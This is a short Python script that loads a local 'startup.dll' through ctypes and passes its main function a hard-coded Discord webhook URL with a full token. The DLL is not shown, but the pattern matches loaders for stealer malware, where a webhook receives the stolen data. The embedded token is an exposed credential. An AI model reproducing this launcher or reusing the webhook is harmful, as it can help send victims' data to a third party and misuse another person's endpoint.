import ctypes

# Load the DLL
mylibrary = ctypes.CDLL('./startup.dll')

# Define the argument type as a string (CString)
mylibrary.main.argtypes = [ctypes.c_char_p]

# Call the main function with a string argument
mylibrary.main(b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe")  # The argument must be a byte string (b"")
